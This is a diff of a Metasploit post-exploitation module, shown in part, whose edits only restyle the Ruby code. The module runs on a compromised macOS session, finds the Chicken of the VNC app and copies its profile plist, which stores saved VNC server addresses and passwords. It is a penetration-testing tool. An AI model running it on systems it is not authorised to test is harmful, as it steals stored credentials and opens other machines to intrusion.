@@ -6,24 +6,26 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::File
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'OS X Gather Chicken of the VNC Profile',
-      'Description'   => %q{
-        This module will download the "Chicken of the VNC" client application's
-        profile file,	which is used to store other VNC servers' information such
-        as the IP and password.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
-      'Platform'      => [ 'osx' ],
-      'SessionTypes'  => [ "meterpreter", "shell" ]
-    ))
-
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'OS X Gather Chicken of the VNC Profile',
+        'Description' => %q{
+          This module will download the "Chicken of the VNC" client application's
+          profile file,	which is used to store other VNC servers' information such
+          as the IP and password.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'sinn3r'],
+        'Platform' => [ 'osx' ],
+        'SessionTypes' => [ 'meterpreter', 'shell' ]
+      )
+    )
   end
 
   def whoami
-    exec("/usr/bin/whoami")
+    exec('/usr/bin/whoami')
   end
 
   #
@@ -52,12 +54,13 @@ class MetasploitModule < Msf::Post
   def dir(path)
     subdirs = exec("ls -l #{path}")
     return [] if subdirs =~ /No such file or directory/
-    items = subdirs.scan(/[A-Z][a-z][a-z]\x20+\d+\x20[\d\:]+\x20(.+)$/).flatten
+
+    items = subdirs.scan(/[A-Z][a-z][a-z]\x20+\d+\x20[\d:]+\x20(.+)$/).flatten
     return items
   end
 
   def locate_chicken
-    dir("/Applications/").each do |folder|
+    dir('/Applications/').each do |folder|
       m = folder.match(/Chicken of the VNC\.app/)
       return true
     end
@@ -76,11 +79,11 @@ class MetasploitModule < Msf::Post
 
   def save(file)
     p = store_loot(
-      "chickenvnc.profile",
-      "bin",
+      'chickenvnc.profile',
+      'bin',
       session,
       file,
-      "com.geekspiff.chickenofthevnc.plist"
+      'com.geekspiff.chickenofthevnc.plist'
     )
 
     print_good("#{@peer} - plist saved in #{p}")
@@ -90,7 +93,7 @@ class MetasploitModule < Msf::Post
     @peer = "#{session.session_host}:#{session.session_port}"
     user = whoami
 
-    if not locate_chicken
+    if !locate_chicken
       print_error("#{@peer} - Chicken of the VNC is not installed")
       return
     else
@@ -99,9 +102,9 @@ class MetasploitModule < Msf::Post
 
     plist = get_profile_plist(user)
     if plist.nil?
-      print_error("No profile plist found")
-    else
-      save(plist) if not plist.nil?
+      print_error('No profile plist found')
+    elsif !plist.nil?
+      save(plist)
     end
   end
 end
